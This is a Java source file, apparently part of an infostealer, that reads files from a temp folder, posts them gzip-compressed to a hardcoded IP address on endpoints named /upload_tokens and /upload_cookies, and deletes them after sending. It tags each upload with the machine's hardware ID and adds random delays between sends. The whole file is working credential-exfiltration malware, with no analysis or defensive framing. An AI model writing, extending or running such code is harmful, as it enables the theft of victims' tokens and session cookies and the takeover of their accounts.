import java.io.*;
import java.net.*;
import java.nio.file.*;
import java.util.*;
import java.util.zip.*;
import java.util.concurrent.*;
import java.time.LocalDateTime;
import java.time.format.DateTimeFormatter;

public class AggregatorSender {
    private static final String EXTRACTED_DIR = System.getenv("TEMP") + "\\SWILL_DEC\\extracted";
    private static final String SERVER_URL = "http://26.184.88.227:8891";
    private static final String HWID = getHWID();
    private static final ScheduledExecutorService scheduler = Executors.newScheduledThreadPool(1);
    private static final Set<String> sentHashes = ConcurrentHashMap.newKeySet();
    
    public static void main(String[] args) {
        log("AggregatorSender started. HWID: " + HWID);
        log("Server URL: " + SERVER_URL);
        log("Watching directory: " + EXTRACTED_DIR);
        scheduler.scheduleAtFixedRate(() -> {
            try { 
                processAndSend(); 
            } catch (Exception e) {
                log("Error in main loop: " + e.getMessage());
            }
        }, 10, 60, TimeUnit.SECONDS);
        log("AggregatorSender is running. Will check every 60 seconds.");
    }
    
    private static void log(String msg) {
        String timestamp = LocalDateTime.now().format(DateTimeFormatter.ofPattern("HH:mm:ss"));
        System.out.println("[Aggregator][" + timestamp + "] " + msg);
    }
    
    private static void processAndSend() {
        File extractedDir = new File(EXTRACTED_DIR);
        if (!extractedDir.exists()) {
            log("Extracted directory does not exist: " + EXTRACTED_DIR);
            return;
        }
        
        File[] files = extractedDir.listFiles();
        if (files == null || files.length == 0) {
            return;
        }
        
        log("Found " + files.length + " file(s) to process");
        
        for (File f : files) {
            String hash = getFileHash(f);
            if (sentHashes.contains(hash)) {
                log("Skipping already sent file: " + f.getName());
                continue;
            }
            
            try {
                String content = new String(Files.readAllBytes(f.toPath()));
                if (content.trim().isEmpty()) {
                    log("Skipping empty file: " + f.getName());
                    continue;
                }
                
                log("Preparing to send: " + f.getName() + " (" + content.length() + " bytes)");
                Thread.sleep(200 + (int)(Math.random() * 300));
                sendData(f.getName(), content);
                
                sentHashes.add(hash);
                f.delete();
                log("Sent and deleted: " + f.getName());
            } catch (Exception e) {
                log("Error processing " + f.getName() + ": " + e.getMessage());
            }
        }
    }
    
    private static void sendData(String filename, String data) {
        HttpURLConnection conn = null;
        try {
            String urlStr = filename.contains("tokens") ? SERVER_URL + "/upload_tokens" : SERVER_URL + "/upload_cookies";
            String payload = "HWID: " + HWID + "\nFILE: " + filename + "\n" + data;
            
            URL url = new URL(urlStr);
            conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setDoOutput(true);
            conn.setConnectTimeout(5000);
            conn.setReadTimeout(10000);
            
            byte[] compressed = compress(payload);
            conn.setRequestProperty("Content-Encoding", "gzip");
            conn.getOutputStream().write(compressed);
            conn.getOutputStream().close();
            
            int code = conn.getResponseCode();
            if (code == 200) {
                log("Successfully sent " + filename + " to " + urlStr + " (HTTP " + code + ")");
            } else {
                log("Failed to send " + filename + " - HTTP response: " + code);
            }
        } catch (Exception e) {
            log("Connection error while sending " + filename + ": " + e.getMessage());
        } finally {
            if (conn != null) conn.disconnect();
        }
    }
    
    private static byte[] compress(String str) throws IOException {
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        GZIPOutputStream gzip = new GZIPOutputStream(bos);
        gzip.write(str.getBytes());
        gzip.close();
        return bos.toByteArray();
    }
    
    private static String getFileHash(File f) {
        try (InputStream in = new FileInputStream(f)) {
            java.security.MessageDigest md = java.security.MessageDigest.getInstance("MD5");
            byte[] buffer = new byte[8192];
            int read;
            while ((read = in.read(buffer)) != -1) md.update(buffer, 0, read);
            return Base64.getEncoder().encodeToString(md.digest());
        } catch (Exception e) { 
            log("Error hashing file: " + e.getMessage());
            return ""; 
        }
    }
    
    private static String getHWID() {
        try {
            Process p = Runtime.getRuntime().exec("wmic csproduct get uuid");
            BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()));
            String line;
            while ((line = r.readLine()) != null) {
                if (line.contains("-")) {
                    String hwid = line.trim();
                    log("HWID detected: " + hwid);
                    return hwid;
                }
            }
        } catch (Exception e) {
            log("Error getting HWID: " + e.getMessage());
        }
        return "UNKNOWN";
    }
}
